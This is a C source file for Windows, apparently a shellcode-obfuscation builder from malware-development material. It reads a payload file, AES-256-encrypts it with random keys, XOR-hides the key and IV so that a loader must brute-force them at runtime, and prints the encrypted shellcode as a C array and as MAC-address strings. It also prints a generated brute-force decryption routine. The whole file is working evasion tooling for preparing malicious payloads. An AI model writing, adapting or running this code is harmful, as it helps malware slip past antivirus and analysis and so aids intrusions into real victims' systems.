#include <stdio.h>
#include <Windows.h>
#include <time.h>

BOOL ReadFileFromDiskA(IN LPCSTR cFileName, OUT PBYTE* ppFileBuffer, OUT PDWORD pdwFileSize) {

	HANDLE		hFile = INVALID_HANDLE_VALUE;
	DWORD		dwFileSize = 0,
		dwNumberOfBytesRead = 0;
	PBYTE		pBaseAddress = NULL;

	if (!cFileName || !pdwFileSize || !ppFileBuffer)
		goto _END_OF_FUNC;

	if ((hFile = CreateFileA(cFileName, GENERIC_READ, 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileA Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	if ((dwFileSize = GetFileSize(hFile, NULL)) == INVALID_FILE_SIZE) {
		printf("[!] GetFileSize Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	if (!(pBaseAddress = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileSize))) {
		printf("[!] HeapAlloc Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	if (!ReadFile(hFile, pBaseAddress, dwFileSize, &dwNumberOfBytesRead, NULL) || dwFileSize != dwNumberOfBytesRead) {
		printf("[!] ReadFile Failed With Error: %d \n[i] Read %d Of %d Bytes \n", GetLastError(), dwNumberOfBytesRead, dwFileSize);
		goto _END_OF_FUNC;
	}

	*ppFileBuffer = pBaseAddress;
	*pdwFileSize = dwFileSize;

_END_OF_FUNC:
	if (hFile != INVALID_HANDLE_VALUE)
		CloseHandle(hFile);
	if (pBaseAddress && !*ppFileBuffer)
		HeapFree(GetProcessHeap(), 0x00, pBaseAddress);
	return (*ppFileBuffer && *pdwFileSize) ? TRUE : FALSE;
}

extern int __cdecl _rdrand32_step(unsigned int*);

PBYTE GenerateRandomKey3(IN DWORD dwKeySize) {

	PBYTE			pKey = NULL;
	unsigned short	us2RightMostBytes = 0;
	unsigned int	uiSeed = 0x00;
	BOOL			bResult = FALSE;

	if (!(pKey = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwKeySize))) {
		printf("[!] HeapAlloc Failed With Error: %d \n", GetLastError());
		return NULL;
	}

	us2RightMostBytes = (unsigned short)((ULONG_PTR)pKey & 0xFFFF);

	for (int i = 0; i < dwKeySize; i++) {

		if (!_rdrand32_step(&uiSeed))
			goto _END_OF_FUNC;

		if (i % 2 == 0)
			pKey[i] = (unsigned int)(((us2RightMostBytes ^ uiSeed) & 0xFF) % 0xFF);
		else
			pKey[i] = (unsigned int)((((us2RightMostBytes ^ uiSeed) >> 8) & 0xFF) % 0xFF);
	}

	bResult = TRUE;

_END_OF_FUNC:
	if (!bResult && pKey) {
		HeapFree(GetProcessHeap(), 0x00, pKey);
		return NULL;
	}
	return pKey;
}

#include "CtAes.h"

BOOL InstallAesEncryptionViaCtAes(IN PBYTE pRawDataBuffer, IN SIZE_T sRawBufferSize, IN PBYTE pAesKey, IN PBYTE pAesIv, OUT PBYTE* ppCipherTextBuffer, OUT SIZE_T* psCipherTextSize) {

	if (!pRawDataBuffer || !sRawBufferSize || !ppCipherTextBuffer || !psCipherTextSize || !pAesKey || !pAesIv)
		return FALSE;

	PBYTE			pNewBuffer = pRawDataBuffer,
		pTmpCipherBuff = NULL;
	SIZE_T			sNewBufferSize = sRawBufferSize;
	AES256_CBC_ctx	AesCtx = { 0x00 };

	if (sRawBufferSize % 16 != 0x00) {

		sNewBufferSize = sRawBufferSize + 16 - (sRawBufferSize % 16);
		pNewBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sNewBufferSize);

		if (!pNewBuffer) {
			printf("[!] HeapAlloc Failed With Error: %d \n", GetLastError());
			return FALSE;
		}

		memcpy(pNewBuffer, pRawDataBuffer, sRawBufferSize);
	}

	if (!(pTmpCipherBuff = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sNewBufferSize))) {
		printf("[!] HeapAlloc Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	RtlSecureZeroMemory(&AesCtx, sizeof(AES256_CBC_ctx));
	AES256_CBC_init(&AesCtx, pAesKey, pAesIv);
	AES256_CBC_encrypt(&AesCtx, (sNewBufferSize / 16), pTmpCipherBuff, pNewBuffer);

	*ppCipherTextBuffer = pTmpCipherBuff;
	*psCipherTextSize = sNewBufferSize;

	return TRUE;
}

#pragma warning(disable : 4996)

#define     MIN_KEY_SIZE      2
#define		MAX_KEY_SIZE	128


BYTE EncryptSubmittedKey(IN PBYTE pKeyArray, IN SIZE_T sKeySize) {

    BYTE    HintByte = pKeyArray[1];
    BYTE    EncryptionByte = (rand() * pKeyArray[0]) % 0xFF;

    for (int i = 0; i < sKeySize; i++)
        pKeyArray[i] = pKeyArray[i] ^ EncryptionByte;

    return HintByte;
}


void PrintDecryptionFunc(IN BYTE bHintByte) {

    printf(
        "BYTE BruteForceDecryption(IN PBYTE pKeyArray, IN SIZE_T sKeySize) {\n"
        "\tint i = 0x00;\n"
        "\tfor (i = 0; i <= 0xFF; i++){\n"
        "\t\tif (((pKeyArray[1] ^ i) %% 0xFF) == 0x%0.2X) {\n"
        "\t\t\tbreak;\n"
        "\t\t}\n"
        "\t}\n\n"
        "\tfor (int x = 0; x < sKeySize; x++)\n"
        "\t\tpKeyArray[x] = pKeyArray[x] ^ i;\n"
        "\treturn i;\n"
        "}\n\n",
        bHintByte);
}

VOID GenerateMAC(IN INT A, IN INT B, IN INT C, IN INT D, IN INT E, IN INT F, OUT PCHAR ppcMACString) {
	unsigned char Output[18] = { 0x00 };
	sprintf_s(Output, sizeof(Output), "%0.2X-%0.2X-%0.2X-%0.2X-%0.2X-%0.2X", A, B, C, D, E, F);
	memcpy(ppcMACString, Output, sizeof(Output));
}

BOOL GenerateMacOutput(IN PBYTE pShellcodeBuffer, IN SIZE_T sShellcodeSize) {

	if (!pShellcodeBuffer || !sShellcodeSize)
		return FALSE;

	PBYTE	pNewPaddedShellcode = pShellcodeBuffer;
	SIZE_T	sNewPaddedSize = sShellcodeSize;

	if (sShellcodeSize % 6 != 0x00) {

		sNewPaddedSize = (sShellcodeSize + 6) - (sShellcodeSize % 6);
		pNewPaddedShellcode = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sNewPaddedSize);

		if (!pNewPaddedShellcode) {
			printf("[!] HeapAlloc Failed With Error: %d \n", GetLastError());
			return FALSE;
		}

		memcpy(pNewPaddedShellcode, pShellcodeBuffer, sShellcodeSize);
	}

	printf("char* mac [%d] = {\n\t", (int)(sNewPaddedSize / 6));

	for (int i = 0, j = 0; i < sNewPaddedSize; i++) {

		if (i % 6 == 0) {

			unsigned char Mac[18] = { 0x00 };

			j++;

			GenerateMAC(
				pNewPaddedShellcode[i + 0x0], pNewPaddedShellcode[i + 0x1],
				pNewPaddedShellcode[i + 0x2], pNewPaddedShellcode[i + 0x3],
				pNewPaddedShellcode[i + 0x4], pNewPaddedShellcode[i + 0x5],
				Mac
			);

			if (i == sNewPaddedSize - 6)
				printf("\"%s\"", Mac);
			else
				printf("\"%s\", ", Mac);

			if (j % 4 == 0)
				printf("\n\t");

		}
	}

	printf("\n};\n\n");
}

void PrintHexString(unsigned char* name, const unsigned char* buffer, size_t bufferSize) {
	printf("unsigned char %s[%d] =\n", name, bufferSize);
	for (size_t i = 0; i < bufferSize; ++i) {
		if (i % 16 == 0) {
			if (i > 0) {
				printf("\"\n");
			}
			printf("\"");
		}
		printf("\\x%02x", buffer[i]);
	}
	printf("\";\n\n");
}

int main(int argc, char* argv[]) {

	unsigned char* File = NULL;
	DWORD FileSize = 0;

	PBYTE CipherText = NULL;
	SIZE_T CipherSize = 0;

	if (argc != 2) {
		printf("Please Supply 1 Argument");
		return -1;
	}

	if (!ReadFileFromDiskA(argv[1], &File, &FileSize)) {
		printf("Failed to Read File from Disk");
		return -1;
	}

	PBYTE AesKey = GenerateRandomKey3(32);
	PBYTE AesIv = GenerateRandomKey3(16);

	if (!InstallAesEncryptionViaCtAes(File, FileSize, AesKey, AesIv, &CipherText, &CipherSize)) {
		printf("Failed to Encrypt Payload");
		return -1;
	}

	BYTE KeyHint = EncryptSubmittedKey(AesKey, 32);
	BYTE IvHint = EncryptSubmittedKey(AesIv, 16);

	PrintHexString("AesKey", AesKey, 32);
	PrintHexString("AesIv", AesIv, 16);
	PrintHexString("Shellcode", CipherText, CipherSize);

	PrintDecryptionFunc(KeyHint);
	PrintDecryptionFunc(IvHint);

	GenerateMacOutput(CipherText, CipherSize);
	GenerateMacOutput(AesKey, 32);
	GenerateMacOutput(AesIv, 16);
}